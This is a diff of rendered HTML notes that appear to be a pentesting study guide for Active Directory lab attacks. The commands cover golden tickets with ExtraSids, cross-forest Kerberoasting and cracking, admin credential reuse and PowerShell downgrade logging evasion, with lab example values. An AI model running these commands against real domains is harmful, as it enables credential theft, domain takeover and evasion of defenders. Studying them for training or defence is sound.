-<span class="normal"><a href="#__codelineno-80-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$madeupUserName</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="nv">$targetedFQDN</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="nv">$sidTargetedDomain</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="nv">$NTLMhashOfKRBTGTaccountDomain</span>  <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="nv">$SIDofEnterpriseAdminGroup</span> <span class="p">/</span><span class="n">ptt</span>
-</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2"></a>
-</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3"></a><span class="c"># Example:</span>
-</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4"></a><span class="c"># kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span>
+<span class="normal"><a href="#__codelineno-80-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1"></a><span class="c"># List C: in the parent domain:</span>
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2"></a><span class="nb">ls </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3"></a><span class="c"># Example: </span>
+</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4"></a><span class="c"># ls \\academy-ea-dc01.inlanefreight.local\c$</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-81-1">1</a></span>
+<span class="normal"><a href="#__codelineno-81-2">2</a></span>
+<span class="normal"><a href="#__codelineno-81-3">3</a></span>
+<span class="normal"><a href="#__codelineno-81-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$madeupUserName</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="nv">$targetedFQDN</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="nv">$sidTargetedDomain</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="nv">$NTLMhashOfKRBTGTaccountDomain</span>  <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="nv">$SIDofEnterpriseAdminGroup</span> <span class="p">/</span><span class="n">ptt</span>
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2"></a>
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3"></a><span class="c"># Example:</span>
+</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4"></a><span class="c"># kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Now, let's list the kerberos tickets in memory:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-81-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1"></a><span class="n">klist</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-82-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1"></a><span class="n">klist</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Now we can perform actions in the parent domain, such as reading a flag:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-82-1">1</a></span>
-<span class="normal"><a href="#__codelineno-82-2">2</a></span>
-<span class="normal"><a href="#__codelineno-82-3">3</a></span>
-<span class="normal"><a href="#__codelineno-82-4">4</a></span>
-<span class="normal"><a href="#__codelineno-82-5">5</a></span>
-<span class="normal"><a href="#__codelineno-82-6">6</a></span>
-<span class="normal"><a href="#__codelineno-82-7">7</a></span>
-<span class="normal"><a href="#__codelineno-82-8">8</a></span>
-<span class="normal"><a href="#__codelineno-82-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1"></a><span class="c"># List C: in the parent domain:</span>
-</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2"></a><span class="nb">ls </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
-</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3"></a><span class="c"># Example: </span>
-</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4"></a><span class="c"># ls \\academy-ea-dc01.inlanefreight.local\c$</span>
-</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5"></a>
-</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6"></a><span class="c"># Read the flag</span>
-</span><span id="__span-82-7"><a id="__codelineno-82-7" name="__codelineno-82-7"></a><span class="nb">cat </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="nv">$path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
-</span><span id="__span-82-8"><a id="__codelineno-82-8" name="__codelineno-82-8"></a><span class="c"># Example: </span>
-</span><span id="__span-82-9"><a id="__codelineno-82-9" name="__codelineno-82-9"></a><span class="c"># cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-83-1">1</a></span>
+<span class="normal"><a href="#__codelineno-83-2">2</a></span>
+<span class="normal"><a href="#__codelineno-83-3">3</a></span>
+<span class="normal"><a href="#__codelineno-83-4">4</a></span>
+<span class="normal"><a href="#__codelineno-83-5">5</a></span>
+<span class="normal"><a href="#__codelineno-83-6">6</a></span>
+<span class="normal"><a href="#__codelineno-83-7">7</a></span>
+<span class="normal"><a href="#__codelineno-83-8">8</a></span>
+<span class="normal"><a href="#__codelineno-83-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1"></a><span class="c"># List C: in the parent domain:</span>
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2"></a><span class="nb">ls </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3"></a><span class="c"># Example: </span>
+</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4"></a><span class="c"># ls \\academy-ea-dc01.inlanefreight.local\c$</span>
+</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5"></a>
+</span><span id="__span-83-6"><a id="__codelineno-83-6" name="__codelineno-83-6"></a><span class="c"># Read the flag</span>
+</span><span id="__span-83-7"><a id="__codelineno-83-7" name="__codelineno-83-7"></a><span class="nb">cat </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="nv">$path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-83-8"><a id="__codelineno-83-8" name="__codelineno-83-8"></a><span class="c"># Example: </span>
+</span><span id="__span-83-9"><a id="__codelineno-83-9" name="__codelineno-83-9"></a><span class="c"># cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="cross-forest-kerberoasting">Cross-Forest Kerberoasting</h3>
 <p>Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.</p>
 <h4 id="enumerating-spns">Enumerating SPNs</h4>
 <p>Enumerating Accounts for Associated SPNs Using Get-DomainUser:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-83-1">1</a></span>
-<span class="normal"><a href="#__codelineno-83-2">2</a></span>
-<span class="normal"><a href="#__codelineno-83-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="n">-Domain</span> <span class="nv">$TargetDomain</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SamAccountName</span>
-</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2"></a><span class="c"># Example:</span>
-</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3"></a><span class="c"># Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-84-1">1</a></span>
+<span class="normal"><a href="#__codelineno-84-2">2</a></span>
+<span class="normal"><a href="#__codelineno-84-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="n">-Domain</span> <span class="nv">$TargetDomain</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SamAccountName</span>
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2"></a><span class="c"># Example:</span>
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3"></a><span class="c"># Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-84-1">1</a></span>
-<span class="normal"><a href="#__codelineno-84-2">2</a></span>
-<span class="normal"><a href="#__codelineno-84-3">3</a></span>
-<span class="normal"><a href="#__codelineno-84-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1"></a>samaccountname
-</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2"></a>--------------
-</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3"></a>krbtgt
-</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4"></a>mssqlsvc
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-85-1">1</a></span>
+<span class="normal"><a href="#__codelineno-85-2">2</a></span>
+<span class="normal"><a href="#__codelineno-85-3">3</a></span>
+<span class="normal"><a href="#__codelineno-85-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1"></a>samaccountname
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2"></a>--------------
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3"></a>krbtgt
+</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4"></a>mssqlsvc
 </span></code></pre></div></td></tr></table></div>
 <p>There is one account with an SPN in the target domain. </p>
 <h4 id="getting-which-groups-is-spm-member-of">Getting which groups is SPM member of</h4>
 <p>A quick check shows that this account is a member of the Domain Admins group in the target domain.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-85-1">1</a></span>
-<span class="normal"><a href="#__codelineno-85-2">2</a></span>
-<span class="normal"><a href="#__codelineno-85-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Domain</span> <span class="nv">$TargetDomain</span> <span class="n">-Identity</span> <span class="nv">$interestingUserSamAccountName</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">memberof</span>
-</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2"></a><span class="c"># Example:</span>
-</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3"></a><span class="c"># Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</span>
-</span></code></pre></div></td></tr></table></div>
-<h4 id="performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag">Performing a Kerberoasting Attacking with Rubeus Using /domain Flag</h4>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-86-1">1</a></span>
 <span class="normal"><a href="#__codelineno-86-2">2</a></span>
-<span class="normal"><a href="#__codelineno-86-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="nv">$TargetDomain</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$interestingUserSamAccountName</span> <span class="p">/</span><span class="n">nowrap</span>
-</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2"></a><span class="c"># Example: </span>
-</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3"></a><span class="c"># .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</span>
+<span class="normal"><a href="#__codelineno-86-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Domain</span> <span class="nv">$TargetDomain</span> <span class="n">-Identity</span> <span class="nv">$interestingUserSamAccountName</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">memberof</span>
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2"></a><span class="c"># Example:</span>
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3"></a><span class="c"># Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag">Performing a Kerberoasting Attacking with Rubeus Using /domain Flag</h4>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-87-1">1</a></span>
+<span class="normal"><a href="#__codelineno-87-2">2</a></span>
+<span class="normal"><a href="#__codelineno-87-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="nv">$TargetDomain</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$interestingUserSamAccountName</span> <span class="p">/</span><span class="n">nowrap</span>
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2"></a><span class="c"># Example: </span>
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3"></a><span class="c"># .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</span>
 </span></code></pre></div></td></tr></table></div>
 <p>When getting the kerberos ticket, we can crack it: </p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-87-1">1</a></span>
-<span class="normal"><a href="#__codelineno-87-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1"></a><span class="go">hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt </span>
-</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2"></a><span class="gp"># </span>Results:<span class="w"> </span>1logistics
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-88-1">1</a></span>
+<span class="normal"><a href="#__codelineno-88-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1"></a><span class="go">hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt </span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2"></a><span class="gp"># </span>Results:<span class="w"> </span>1logistics
 </span></code></pre></div></td></tr></table></div>
 <h3 id="admin-password-re-use-group-membership">Admin Password Re-Use &amp; Group Membership</h3>
 <p>From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.</p>
 <h4 id="using-get-domainforeigngroupmember">Using Get-DomainForeignGroupMember</h4>
 <p>For instance,  the <code>FREIGHTLOGISTICS.LOCAL</code> domain with which we have an external bidirectional forest trust.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-88-1">1</a></span>
-<span class="normal"><a href="#__codelineno-88-2">2</a></span>
-<span class="normal"><a href="#__codelineno-88-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1"></a><span class="nb">Get-DomainForeignGroupMember</span> <span class="n">-Domain</span> <span class="nv">$targeteddomain</span>
-</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2"></a><span class="c"># Example:</span>
-</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3"></a><span class="c"># Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-89-1">1</a></span>
+<span class="normal"><a href="#__codelineno-89-2">2</a></span>
+<span class="normal"><a href="#__codelineno-89-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1"></a><span class="nb">Get-DomainForeignGroupMember</span> <span class="n">-Domain</span> <span class="nv">$targeteddomain</span>
+</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2"></a><span class="c"># Example:</span>
+</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3"></a><span class="c"># Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Results:
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-89-1">1</a></span>
-<span class="normal"><a href="#__codelineno-89-2">2</a></span>
-<span class="normal"><a href="#__codelineno-89-3">3</a></span>
-<span class="normal"><a href="#__codelineno-89-4">4</a></span>
-<span class="normal"><a href="#__codelineno-89-5">5</a></span>
-<span class="normal"><a href="#__codelineno-89-6">6</a></span>
-<span class="normal"><a href="#__codelineno-89-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1"></a>GroupDomain             : FREIGHTLOGISTICS.LOCAL
-</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2"></a>GroupName               : Administrators
-</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3"></a>GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
-</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4"></a>MemberDomain            : FREIGHTLOGISTICS.LOCAL
-</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5"></a>MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
-</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6"></a>MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
-</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7"></a>                          TICS,DC=LOCAL
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-90-1">1</a></span>
+<span class="normal"><a href="#__codelineno-90-2">2</a></span>
+<span class="normal"><a href="#__codelineno-90-3">3</a></span>
+<span class="normal"><a href="#__codelineno-90-4">4</a></span>
+<span class="normal"><a href="#__codelineno-90-5">5</a></span>
+<span class="normal"><a href="#__codelineno-90-6">6</a></span>
+<span class="normal"><a href="#__codelineno-90-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1"></a>GroupDomain             : FREIGHTLOGISTICS.LOCAL
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2"></a>GroupName               : Administrators
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3"></a>GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4"></a>MemberDomain            : FREIGHTLOGISTICS.LOCAL
+</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5"></a>MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6"></a>MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7"></a>                          TICS,DC=LOCAL
 </span></code></pre></div></td></tr></table></div></p>
 <p>If we convert the SID to name:
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-90-1">1</a></span>
-<span class="normal"><a href="#__codelineno-90-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1"></a><span class="nb">Convert-SidToName</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">500</span>
-</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2"></a><span class="c"># Results: INLANEFREIGHT\administrator</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-91-1">1</a></span>
+<span class="normal"><a href="#__codelineno-91-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1"></a><span class="nb">Convert-SidToName</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">500</span>
+</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2"></a><span class="c"># Results: INLANEFREIGHT\administrator</span>
 </span></code></pre></div></td></tr></table></div></p>
 <p>Meaning that the built-in Administrators group in <code>FREIGHTLOGISTICS.LOCAL</code> has the built-in Administrator account for the <code>INLANEFREIGHT.LOCAL</code> domain as a member.</p>
 <h4 id="accessing-dc03-using-enter-pssession">Accessing DC03 Using Enter-PSSession</h4>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-91-1">1</a></span>
-<span class="normal"><a href="#__codelineno-91-2">2</a></span>
-<span class="normal"><a href="#__codelineno-91-3">3</a></span>
-<span class="normal"><a href="#__codelineno-91-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nv">$hostname</span><span class="p">.</span><span class="nv">$targeteddomain</span> <span class="n">-Credential</span> <span class="nv">$ParentDomain</span><span class="p">\</span><span class="n">administrator</span>
-</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2"></a><span class="c"># Example:</span>
-</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3"></a><span class="c"># Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</span>
-</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4"></a><span class="c"># From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-92-1">1</a></span>
+<span class="normal"><a href="#__codelineno-92-2">2</a></span>
+<span class="normal"><a href="#__codelineno-92-3">3</a></span>
+<span class="normal"><a href="#__codelineno-92-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nv">$hostname</span><span class="p">.</span><span class="nv">$targeteddomain</span> <span class="n">-Credential</span> <span class="nv">$ParentDomain</span><span class="p">\</span><span class="n">administrator</span>
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2"></a><span class="c"># Example:</span>
+</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3"></a><span class="c"># Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</span>
+</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4"></a><span class="c"># From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="sid-history-abuse-cross-forest">SID History Abuse - Cross Forest</h3>
 <p>SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest.</p>
@@ -19043,13 +19098,13 @@ This repository provides a few techniques and scripts regarding the impact of Mi
 <h4 id="downgrade-powershell">Downgrade Powershell</h4>
 <p>Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. </p>
 <p>With <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2">Script Block Logging</a> enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0.</p>
